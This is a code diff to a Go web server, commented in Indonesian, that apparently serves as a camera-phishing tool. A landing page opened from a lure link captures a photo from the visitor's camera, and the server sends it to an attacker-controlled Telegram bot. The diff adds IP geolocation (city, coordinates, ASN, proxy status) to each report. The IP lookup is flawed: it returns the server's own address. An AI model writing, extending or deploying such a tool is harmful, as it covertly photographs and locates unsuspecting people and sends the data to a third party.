@@ -18,6 +18,7 @@ import (
 
 var botToken string
 var chatID string
+var ip2LocationToken string
 
 type PhotoData struct {
 	Image   string `json:"image"`
@@ -25,6 +26,18 @@ type PhotoData struct {
 	URLID   string `json:"urlId"`
 	Camera  string `json:"camera"`
 	Message string `json:"message"`
+}
+
+type LocationData struct {
+	CountryCode string  `json:"country_code"`
+	CountryName string  `json:"country_name"`
+	RegionName  string  `json:"region_name"`
+	CityName    string  `json:"city_name"`
+	Latitude    float64 `json:"latitude"`
+	Longitude   float64 `json:"longitude"`
+	ASN         string  `json:"asn"` // Autonomous System Number
+	AS          string  `json:"as"`  // Autonomous System
+	IsProxy     bool    `json:"is_proxy"`
 }
 
 func serveLandingPage(w http.ResponseWriter, r *http.Request) {
@@ -149,6 +162,36 @@ func serveLandingPage(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(htmlContent))
 }
 
+func getIPAndLocation() (string, *LocationData, error) {
+	ipResp, err := http.Get("https://api.ipify.org/?format=json")
+	if err != nil {
+		return "", nil, fmt.Errorf("gagal mendapatkan IP publik: %w", err)
+	}
+	defer ipResp.Body.Close()
+
+	var ipResult struct {
+		IP string `json:"ip"`
+	}
+	if err := json.NewDecoder(ipResp.Body).Decode(&ipResult); err != nil {
+		return "", nil, fmt.Errorf("gagal mendekode respons IP: %w", err)
+	}
+
+	ip := ipResult.IP
+
+	locationResp, err := http.Get(fmt.Sprintf("https://api.ip2location.io/?key=%s&ip=%s", ip2LocationToken, ip))
+	if err != nil {
+		return ip, nil, fmt.Errorf("gagal mendapatkan data lokasi: %w", err)
+	}
+	defer locationResp.Body.Close()
+
+	var locationData LocationData
+	if err := json.NewDecoder(locationResp.Body).Decode(&locationData); err != nil {
+		return ip, nil, fmt.Errorf("gagal mendekode respons lokasi: %w", err)
+	}
+
+	return ip, &locationData, nil
+}
+
 func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Metode HTTP tidak valid", http.StatusMethodNotAllowed)
@@ -167,46 +210,39 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	ipAddr, err := http.Get("https://api.ipify.org/?format=json")
+	// Dapatkan IP dan data lokasi
+	ip, location, err := getIPAndLocation()
 	if err != nil {
-		log.Printf("Error getting ip address: %v", err)
+		log.Printf("Gagal mendapatkan IP atau lokasi: %v", err)
+		http.Error(w, "Gagal mendapatkan data lokasi", http.StatusInternalServerError)
 		return
 	}
-	defer ipAddr.Body.Close()
-
-	getIpAddr, err := ioutil.ReadAll(ipAddr.Body)
-	if err != nil {
-		log.Printf("Error getting ip address: %v", err)
-		return
-	}
-
-	log.Printf("Got ip address: %s", getIpAddr)
-
-	var ipResult map[string]interface{}
-	if err := json.Unmarshal(getIpAddr, &ipResult); err != nil {
-		log.Printf("Error getting ip address: %v", err)
-		return
-	}
-
-	ip, ok := ipResult["ip"].(string)
-	if !ok {
-		return
-	}
-
-	ipAddress := ip
-	urlAddress := data.URLID
-	urlHost := r.Host
 
 	// Dekode string base64 menjadi byte
 	photoBytes, err := base64.StdEncoding.DecodeString(data.Image[len("data:image/jpeg;base64,"):])
 	if err != nil {
+		log.Printf("Gagal mendekode gambar base64: %v", err)
 		http.Error(w, "Gagal mendekode gambar base64", http.StatusInternalServerError)
 		return
 	}
 
-	messageBytes := "IP Address\t: " + ipAddress + "\nFrom URL\t: " + urlAddress + "\nURL Host\t: " + urlHost
+	message := fmt.Sprintf(
+		"IP Address\t: %s\nDari URL\t: %s\nURL Host\t: %s\n\nLokasi:\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\n\nJaringan:\nASN\t: %s\nAS\t: %s\nIs Proxy\t: %t",
+		ip,
+		data.URLID,
+		r.Host,
+		location.CountryCode,
+		location.CountryName,
+		location.RegionName,
+		location.CityName,
+		location.Latitude,
+		location.Longitude,
+		location.ASN,
+		location.AS,
+		location.IsProxy,
+	)
 
-	if err := sendMessageToTelegram(messageBytes); err != nil {
+	if err := sendMessageToTelegram(message); err != nil {
 		log.Printf("Gagal mengirim pesan ke Telegram: %v", err)
 	}
 
@@ -218,14 +254,14 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprintf(w, "Foto berhasil diterima.")
 }
 
-func sendMessageToTelegram(messageBytes string) error {
+func sendMessageToTelegram(message string) error {
 	telegramAPIURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"
 
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
 
 	writer.WriteField("chat_id", chatID)
-	writer.WriteField("text", string(messageBytes))
+	writer.WriteField("text", message)
 
 	writer.Close()
 
@@ -263,7 +299,6 @@ func sendPhotoToTelegram(photoBytes []byte) error {
 
 	writer.WriteField("chat_id", chatID)
 
-	// Tambahkan file foto.
 	part, err := writer.CreateFormFile("photo", "user_photo.jpg")
 	if err != nil {
 		return fmt.Errorf("gagal membuat form file: %w", err)
@@ -276,7 +311,6 @@ func sendPhotoToTelegram(photoBytes []byte) error {
 
 	writer.Close()
 
-	// Buat permintaan HTTP POST
 	req, err := http.NewRequest("POST", telegramAPIURL, body)
 	if err != nil {
 		return fmt.Errorf("gagal membuat permintaan HTTP: %w", err)
@@ -284,7 +318,6 @@ func sendPhotoToTelegram(photoBytes []byte) error {
 
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 
-	// Lakukan permintaan
 	client := &http.Client{Timeout: 30 * time.Second}
 	resp, err := client.Do(req)
 	if err != nil {
@@ -312,9 +345,10 @@ func main() {
 
 	botToken = os.Getenv("botToken")
 	chatID = os.Getenv("chatID")
+	ip2LocationToken = os.Getenv("ip2LocationToken")
 
-	if botToken == "" || chatID == "" {
-		log.Fatal("Variabel botToken atau chatID tidak ditemukan di file .env")
+	if botToken == "" || chatID == "" || ip2LocationToken == "" {
+		log.Fatal("Variabel botToken/chatID/ip2LocationToken tidak ditemukan di file .env")
 	}
 
 	// contoh payload: http://localhost:8080/?url=https://google.com
